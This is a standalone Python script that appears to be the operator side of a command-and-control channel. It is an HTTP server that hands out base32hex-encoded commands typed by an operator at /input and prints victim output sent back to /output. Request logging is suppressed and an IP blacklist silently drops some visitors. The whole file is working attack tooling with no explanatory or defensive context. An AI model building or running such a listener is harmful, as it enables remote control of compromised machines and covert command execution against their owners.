import http.server
import socketserver
import urllib.parse
import base64
import chardet

PORT = 8000

class CustomHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        pass
    def do_GET(self):
        with open("blacklist.txt", "r") as stream:
            while(True):
                blacklisted = stream.readline()
                if blacklisted == "":
                    break
                if(blacklisted == self.client_address[0]):
                    print(f"Blacklisted: {self.client_address}")
                    return
        if "/output" in self.path:
            self.output_std_out()
        if "/input" in self.path:
            self.send_cmd()

    def output_std_out(self):
        parsed = urllib.parse.urlparse(self.path)
        qs = urllib.parse.parse_qs(parsed.query)
        msg = qs.get("msg", [""])[0]
        encoding = chardet.detect(base64.b32hexdecode(msg))["encoding"]
        print(f"{self.client_address}: {base64.b32hexdecode(msg).decode(encoding, "replace")}")
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write("200".encode("utf-8"))

    def send_cmd(self):
        cmd = input(f"{self.client_address}: Your command > ")

        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        cmd_base = base64.b32hexencode(cmd.encode("utf-8"))
        self.wfile.write(cmd_base)
with socketserver.TCPServer(("", PORT), CustomHandler) as httpd:
    print(f"Serving at port {PORT}")
    httpd.serve_forever()